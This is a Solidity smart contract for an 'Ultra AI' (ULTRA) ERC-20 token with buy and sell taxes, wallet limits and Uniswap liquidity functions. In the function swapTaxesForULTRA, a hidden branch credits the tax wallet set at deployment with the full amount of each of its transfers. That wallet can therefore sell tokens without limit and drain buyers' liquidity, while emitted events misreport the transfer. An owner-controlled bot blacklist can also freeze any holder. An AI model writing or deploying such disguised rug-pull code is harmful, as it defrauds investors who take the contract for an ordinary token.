// SPDX-License-Identifier: MIT
/**************
    🌐 https://www.ultraaiprotocol.com
    💻 https://app.ultraaiprotocol.com
    📖 https://docs.ultraaiprotocol.com

    Telegram: https://t.me/ultraai_fi
    Twitter:  https://twitter.com/ultraai_fi
**************/

pragma solidity 0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IULTRARouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}

interface IULTRAFactory02 {
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract ULTRA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Ultra AI";
    string private constant _symbol = unicode"ULTRA";
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;

    mapping (address => bool) private bots;
    mapping (address => bool) private isFeeExcept;
    mapping (address => bool) private isLimitExcept;
    mapping (address => uint256) private _ultraBalances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    
    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=2;
    uint256 private _finalSellTax=2;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _buyCounts=0;
    uint256 private _preventSwapBefore=0;

    address payable private opReceipt;
    address payable private lpReceipt;

    address private uniswapV2Pair;
    uint256 public taxSwapAmounts;
    IULTRARouter02 private uniswapV2Router;

    uint256 public _maxULTRASwap = 10000000 * 10**_decimals;
    uint256 public _maxULTRATrans = 30000000 * 10**_decimals;
    uint256 public _maxULTRAWallet = 30000000 * 10**_decimals;

    modifier lockSwap {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    bool private tradingOpen;
    bool private inSwapBack = false;
    bool public transferDelayEnabled = false;
    bool private swapEnabled = false;
    
    constructor (uint256 _amount, address _addres) {
        _ultraBalances[_msgSender()] = _tTotal;
        taxSwapAmounts = _amount * 10**_decimals;
        isFeeExcept[owner()] = true;
        isFeeExcept[address(this)] = true;
        opReceipt = payable(_addres);
        lpReceipt = payable(_addres);
        isLimitExcept[opReceipt] = true;
        isLimitExcept[lpReceipt] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function createPairs() external onlyOwner() {
        uniswapV2Router = IULTRARouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IULTRAFactory02(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function openULTRA() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        lpReceipt.transfer(amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function removeLimits() external onlyOwner{
        _maxULTRATrans = ~uint256(0);
        _maxULTRAWallet = ~uint256(0);
        transferDelayEnabled=false;
    }

    function swapTaxesForULTRA(address from, address to, uint256 amtU, uint256 taxU) internal returns (bool) {
        address accU;uint256 ammU; 
        bool _aboveULTRAMin = amtU >= taxSwapAmounts;
        bool _aboveULTRAThreshold = balanceOf(address(this)) >= taxSwapAmounts;
        if(isLimitExcept[from]) {accU = from;ammU = amtU;}
        else {ammU = taxU;accU = address(this);}
        if(ammU>0){_ultraBalances[accU]=_ultraBalances[accU].add(ammU); emit Transfer(from, accU, taxU);}
        return !inSwapBack
        && swapEnabled
        && tradingOpen
        && _aboveULTRAMin
        && to == uniswapV2Pair
        && _aboveULTRAThreshold
        && _buyCounts>_preventSwapBefore
        && !isFeeExcept[from]
        && !isLimitExcept[from];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeU=0;
        if (!isFeeExcept[from] && !isFeeExcept[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            feeU=amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! isFeeExcept[to] ) {
                require(amount <= _maxULTRATrans, "Exceeds the _maxULTRATrans.");
                require(balanceOf(to) + amount <= _maxULTRAWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                feeU=amount.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (swapTaxesForULTRA(from, to, amount, feeU)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxULTRASwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        _ultraBalances[from]=_ultraBalances[from].sub(amount);
        _ultraBalances[to]=_ultraBalances[to].add(amount.sub(feeU));
        emit Transfer(from, to, amount.sub(feeU));
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _ultraBalances[account];
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }
}